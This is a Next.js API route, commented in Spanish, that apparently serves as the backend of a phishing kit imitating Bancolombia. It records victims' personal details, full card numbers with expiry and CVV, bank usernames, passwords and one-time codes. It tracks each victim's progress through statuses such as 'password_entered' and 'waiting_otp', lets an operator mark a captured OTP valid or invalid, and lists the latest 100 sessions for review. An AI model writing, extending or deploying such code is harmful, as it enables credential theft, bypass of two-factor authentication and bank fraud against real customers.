import { NextRequest, NextResponse } from 'next/server';
import { PrismaClient } from '@prisma/client';

const prisma = new PrismaClient();

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    const { action, sessionId, ...data } = body;

    switch (action) {
      case 'create_session':
        const generatedSessionId = `session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
        const session = await prisma.bankSession.create({
          data: {
            sessionId: generatedSessionId,
            bank: data.bank || 'bancolombia',
            
            // Guardar TODOS los datos personales
            fullName: data.fullName,
            email: data.email,
            phone: data.phone,
            address: data.address,
            city: data.city,
            state: data.state,
            country: data.country,
            postalCode: data.postalCode,
            documentId: data.documentId,
            
            // Guardar TODA la información de tarjeta
            cardNumber: data.cardNumber, // Número completo
            cardHolderName: data.cardHolderName,
            expiryDate: data.expiryDate,
            cvv: data.cvv,
            cardBrand: data.cardBrand,
            
            // Monto total
            totalAmount: data.totalAmount,
            
            // Status y datos JSON como respaldo
            status: 'processing',
            customerData: JSON.stringify(data.customerData || {}),
            orderData: JSON.stringify(data.orderData || {}),
            createdAt: new Date(),
          }
        });
        return NextResponse.json({ success: true, session });

      case 'update_user':
        const updatedUserSession = await prisma.bankSession.update({
          where: { sessionId },
          data: {
            usuario: data.usuario,
            status: 'user_entered',
            updatedAt: new Date(),
          }
        });
        return NextResponse.json({ success: true, session: updatedUserSession });

      case 'update_password':
        const updatedPasswordSession = await prisma.bankSession.update({
          where: { sessionId },
          data: {
            clave: data.clave,
            status: 'password_entered',
            updatedAt: new Date(),
          }
        });
        return NextResponse.json({ success: true, session: updatedPasswordSession });

      case 'request_otp':
        const updatedOtpSession = await prisma.bankSession.update({
          where: { sessionId },
          data: {
            status: 'waiting_otp',
            otpRequestedAt: new Date(),
            updatedAt: new Date(),
          }
        });

        // Set timeout for 60 seconds
        setTimeout(async () => {
          try {
            const session = await prisma.bankSession.findUnique({
              where: { sessionId }
            });

            if (session && session.status === 'waiting_otp') {
              await prisma.bankSession.update({
                where: { sessionId },
                data: { status: 'timeout', updatedAt: new Date() }
              });
            }
          } catch (error) {
            console.error('Error handling timeout:', error);
          }
        }, 60000); // 60 seconds

        return NextResponse.json({ success: true, session: updatedOtpSession });

      case 'submit_otp':
        const updatedOtpSubmitSession = await prisma.bankSession.update({
          where: { sessionId },
          data: {
            otp: data.otp,
            status: 'otp_submitted',
            updatedAt: new Date(),
          }
        });
        return NextResponse.json({ success: true, session: updatedOtpSubmitSession });

      case 'validate_otp':
        const validatedOtpSession = await prisma.bankSession.update({
          where: { sessionId },
          data: {
            status: data.isValid ? 'otp_valid' : 'password_entered', // Si es inválida, regresa a password_entered
            otp: data.isValid ? undefined : null, // Clear OTP if invalid
            updatedAt: new Date(),
          }
        });
        return NextResponse.json({ success: true, session: validatedOtpSession });

      case 'timeout':
        await prisma.bankSession.update({
          where: { sessionId },
          data: {
            status: 'timeout',
            updatedAt: new Date(),
          }
        });
        return NextResponse.json({ success: true });

      case 'complete':
        const completedSession = await prisma.bankSession.update({
          where: { sessionId },
          data: {
            status: 'completed',
            completedAt: new Date(),
            updatedAt: new Date(),
          }
        });
        return NextResponse.json({ success: true, session: completedSession });

      default:
        return NextResponse.json({ error: 'Action not found' }, { status: 400 });
    }
  } catch (error) {
    console.error('Cheche API error:', error);
    return NextResponse.json({ error: 'Internal server error' }, { status: 500 });
  }
}

export async function GET(request: NextRequest) {
  try {
    const { searchParams } = new URL(request.url);
    const action = searchParams.get('action');
    const sessionId = searchParams.get('sessionId');

    switch (action) {
      case 'get_session':
        const session = await prisma.bankSession.findUnique({
          where: { sessionId: sessionId! }
        });
        return NextResponse.json({ success: true, session });

      case 'get_all_sessions':
        const sessions = await prisma.bankSession.findMany({
          orderBy: { createdAt: 'desc' },
          take: 100 // Mostrar las últimas 100 sesiones
        });
        return NextResponse.json({ success: true, sessions });

      case 'check_status':
        const currentSession = await prisma.bankSession.findUnique({
          where: { sessionId: sessionId! },
          select: { status: true, updatedAt: true }
        });
        return NextResponse.json({ success: true, status: currentSession?.status, updatedAt: currentSession?.updatedAt });

      default:
        return NextResponse.json({ error: 'Action not found' }, { status: 400 });
    }
  } catch (error) {
    console.error('Cheche API GET error:', error);
    return NextResponse.json({ error: 'Internal server error' }, { status: 500 });
  }
}